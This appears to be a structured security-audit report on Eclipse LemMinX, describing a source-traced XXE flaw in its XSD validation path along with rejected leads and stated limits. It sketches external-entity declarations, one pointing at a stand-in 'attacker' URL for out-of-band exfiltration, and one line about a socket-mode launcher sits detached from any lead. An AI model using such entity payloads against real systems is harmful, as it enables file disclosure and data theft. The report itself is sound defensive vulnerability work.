candidates.attacker_control: The attacker controls the contents of an XML Schema file that the victim opens/validates (e.g. a schema from a cloned repository, a downloaded/copied .xsd, or an XSD reached via xs:import/xs:include). Content added inside a DOCTYPE internal subset (<!ENTITY name SYSTEM "file:///... ">, <!ENTITY % pe SYSTEM "http://attacker/...">) is processed by the XSD grammar preparser. The XML instance document alone is not sufficient on this path.
candidates.counterevidence_checked: The project already has protections for this class of issue: LSPXMLParserConfiguration.java:64-71 applies disallow-doctype-decl and maps resolveExternalEntities onto the same two Xerces features (default false, XMLValidationSettings.java:47), DOMUtils.newSAXParserFactory disallows DOCTYPE for other SAX uses (DOMUtils.java:153-159), and entity-expansion/max-occur limits are set (LSPXMLParserConfiguration.java:72-78). These confirm the forced 'true' values in the XSD path are the anomaly, but also show the codebase intentionally supports DTD/entity use in some flows. On the ordinary XML-instance path, referenced XSDs are parsed by LSPSAXParser/LSPXMLParserConfiguration, so xsi:schemaLocation in a plain XML file is not expected to reach this vector; the attack needs an XSD document (or grammar import/include) to be validated. Expanded content is not automatically transmitted to a remote party, so disclosure requires OOB exfiltration or the user viewing generated documentation. Whether Xerces 2.12.2 XMLSchemaLoader actually honors these features could not be verified from this snapshot (dependency is not in the tree).
candidates.impact: XML External Entity injection in the language-server process: local file disclosure (file contents expanded into the schema model and surfaced in schema documentation/hover/diagnostics), server-side request forgery from the LS host to arbitrary http(s)/file targets via entity SYSTEM ids and external parameter entities, and out-of-band exfiltration using an attacker-hosted parameter-entity DTD (the same feature flag that enables the OOB chain is forced on). Under default settings an attacker-supplied schema only needs to be opened to trigger parsing.
candidates.prerequisites: Validation enabled (default true, XMLValidationSettings:43-50 and XMLDiagnostics:44); the validated document is an XML Schema (DOMUtils.isXSD true: .xsd URI or xsd:schema root); the schema contains a DOCTYPE/entity declaration with an external SYSTEM id or an external parameter-entity reference. The xml.validation.resolveExternalEntities=false and xml.validation.disallowDocTypeDecl=true settings do not mitigate, because this path ignores them.
candidates.root_cause: XSDValidator.doDiagnostics() builds a Xerces XMLGrammarPreparser for XML Schema validation and forces EXTERNAL_GENERAL_ENTITIES_FEATURE and EXTERNAL_PARAMETER_ENTITIES_FEATURE to true (XSDValidator.java:81-84). Unlike the main parse path (LSPXMLParserConfiguration.java:64-71), it never consults XMLValidationSettings.isResolveExternalEntities()/isDisallowDocTypeDecl(), whose defaults are false/false (XMLValidationSettings.java:29-31,43-50). As a result, an XSD document (or an imported/included schema) is parsed with DOCTYPE and external-entity resolution enabled even when the user configured the protections that were added for CVE-2019-18213.
candidates.title: XSD validation unconditionally enables external entity resolution, allowing XXE via attacker-controlled XML Schema documents
candidates.trace: textDocument/didOpen(.xsd) -> XMLTextDocumentService diagnostics -> XMLDiagnostics.doExtensionsDiagnostics (XMLDiagnostics.java:60-73) -> XSDDiagnosticsParticipant.doDiagnostics (DOMUtils.isXSD check) -> XSDValidator.doDiagnostics -> LSPXMLGrammarPreparser with XMLSchemaLoader registered (XSDValidator.java:67-70) -> grammarPreparser.setFeature(EXTERNAL_GENERAL_ENTITIES_FEATURE/EXTERNAL_PARAMETER_ENTITIES_FEATURE, true) (XSDValidator.java:81-84) -> preparseGrammar parses the attacker schema with entity resolution on (XSDValidator.java:98-103) -> &entity; expansion reads local files and external parameter entities are fetched from attacker-controlled URLs, with schema content surfaced via XSD documentation/hover and diagnostics.
candidates.unverified: No code execution, tests, or Xerces internals inspection was possible; the candidate is not runtime-confirmed. Not verified: that XMLGrammarPreparser propagates the features to XMLSchemaLoader as expected; the exact Xerces behavior for external parameter entities in the XSD grammar loader; whether any other code path sanitizes/normalizes imported XSDs before this preparser.
candidates.weakness_type: CWE-611 Improper Restriction of XML External Entity Reference

coverage_summary: Reviewed the assigned 445-file snapshot, which contains only org.eclipse.lemminx/src/main sources plus docs/build/wrapper files (no test sources were exposed). Searched all readable sources for XXE/entity/DTD/XSD handling, SAX/Xerces feature configuration, URL/stream opening, path and cache handling, command/execution sinks, and file-generation code; read in full or in part the contentmodel and XSD validation pipelines, parser configuration and entity managers, URI resolver/cache/catalog code, file-path completion, generator manager, workspace/text-document services, and logging utilities. Not exhaustively read: large DOM/scanner/formatter internals (XMLScanner, DOMParser, XMLFormatter, XMLPositionUtility), XPath matcher internals, and most code-action participants; binary files were skipped by policy.
limitations: No tests were present in the snapshot and no code, scanners, or exploit payloads were executed; findings are source-evidence only and not runtime-confirmed.

Third-party dependency behavior (Xerces 2.12.2 XMLSchemaLoader/XMLDTDLoader, jsoup, guava) could not be inspected, so feature-propagation and true default behavior are inferred from usage sites, not verified.
Large portions of the scanner/DOM/formatter and code-action code were only searched, not fully read, so an unrelated issue in those areas could have been missed.

The repository has no git history or patch information in scope, so the specific upstream security fix corresponding to this snapshot could not be identified; the candidate is the strongest issue found by source tracing, not a claim that it is the only issue.

rejected_leads.lead: CacheResourcesManager.downloadResource follows HTTP redirects without re-checking the scheme/host against protocolsForCahe, so a malicious remote schema host could redirect to file:/jar: URLs (CacheResourcesManager.java:191-202).
rejected_leads.reason: The redirect loop is part of the intended external-resource download feature; the resolved cache path is traversal-checked (getResourceCachePath, lines 251-263) and constrained by FilesUtils.isIncludedInDeployedPath (lines 152-155), and no exfiltration path from downloaded bytes was traced. Weaker and less attacker-reachable than the XSD path.

rejected_leads.lead: XMLValidator.isValidLocation performs new URL(resolvedLocation).openStream() on a schemaLocation taken from the document (XMLValidator.java:262-272), an SSRF/file-probe sink.
rejected_leads.reason: Only reached when xml.validation.schema.enabled=onValidSchema (non-default; XMLSchemaSettings.java:21-23 defaults to always), and resolving/ downloading schemas is the intended feature; no additional trust boundary crossed.

rejected_leads.lead: XMLModelAwareParserConfiguration/ExternalXMLDTDValidator load xml-model or file-association DTDs through a fresh XMLDTDLoader (ExternalXMLDTDValidator.java:119-133), whose external-entity defaults are not set explicitly.
rejected_leads.reason: Loading the bound DTD is intended behavior; Xerces XMLDTDLoader defaults cannot be inspected in this snapshot, so no concrete violation of a stated security setting was demonstrated.
Development/socket-mode launcher; the normal deployment is stdio LanguageServer, so this is a hardening concern rather than a reachable vulnerability in the reviewed code.

rejected_leads.lead: ParentProcessWatcher runs Runtime.getRuntime().exec with a command built from the LSP initialize processId (ParentProcessWatcher.java:89-96).
rejected_leads.reason: The PID is a numeric long from the client, so no shell-command injection was identified.

summary: Eclipse LemMinX 0.19.0-SNAPSHOT source review (445 visible main-source files). The strongest plausible issue is an XXE / external-entity restriction bypass in the XML-Schema validation path: XSDValidator unconditionally turns on Xerces external general and parameter entity resolution while the rest of the server deliberately keeps those features off (or user-controlled) for XML instance validation. No runtime execution or dependency internals were available, so this remains a source-evidence lead, not a confirmed exploit.
